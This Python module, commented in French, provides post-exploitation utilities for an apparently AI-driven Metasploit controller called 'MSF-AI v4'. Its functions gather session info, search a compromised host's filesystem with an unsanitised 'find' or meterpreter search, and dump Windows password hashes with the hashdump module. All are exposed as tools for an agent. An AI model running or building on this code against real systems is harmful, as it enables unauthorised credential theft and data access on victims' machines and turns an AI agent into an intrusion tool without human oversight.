"""
Utilitaires de Post-Exploitation pour MSF-AI v4
NOTE : La plupart des outils ici nécessitent l'objet client MSF, injecté par le contrôleur.
"""
import time
from typing import Dict, Any

def wait_for_session_output(session, timeout: int = 5) -> str:
    """Assistant pour attendre et collecter la sortie d'une session."""
    output = ""
    start_time = time.time()
    while time.time() - start_time < timeout:
        res = session.read_output()
        if res:
            output += res
            # Si nous avons reçu quelque chose, attendons encore un peu pour le reste
            time.sleep(0.5)
        else:
            if output: break # Sortir si nous avions de la sortie et qu'elle s'est arrêtée
            time.sleep(0.5)
    return output

def gather_system_info(client, session_id: int) -> Dict[str, Any]:
    """Collecte les informations système d'une session."""
    try:
        session = client.sessions.session(str(session_id))
        if not session: return {"error": "Session non trouvée"}

        info = {
            "type": session.get("type"),
            "platform": session.get("platform"),
            "info": session.get("info")
        }
        return info
    except Exception as e:
        return {"error": str(e)}

def search_files(client, session_id: int, pattern: str) -> str:
    """Recherche des fichiers sur l'hôte compromis."""
    try:
        session = client.sessions.session(str(session_id))
        if not session: return "Session non trouvée"

        if session.get("type") != "meterpreter":
            # Essayer une commande shell standard
            session.write(f"find / -name '{pattern}'\n")
            return wait_for_session_output(session)

        session.write(f"search -f {pattern}\n")
        return wait_for_session_output(session)
    except Exception as e:
        return f"Erreur : {e}"

def extract_credentials(client, session_id: int) -> str:
    """Exécute hashdump ou kiwi pour extraire des identifiants."""
    try:
        session = client.sessions.session(str(session_id))
        if not session: return "Session non trouvée"
        if session.get("type") != "meterpreter":
            return "Nécessite une session meterpreter"

        session.run_module("post/windows/gather/hashdump")
        return "Module Hashdump exécuté sur la session."
    except Exception as e:
        return f"Erreur : {e}"

def get_tools() -> Dict[str, Any]:
    """Retourne les outils de post-exploitation."""
    return {
        "gather_system_info": gather_system_info,
        "search_files": search_files,
        "extract_credentials": extract_credentials
    }
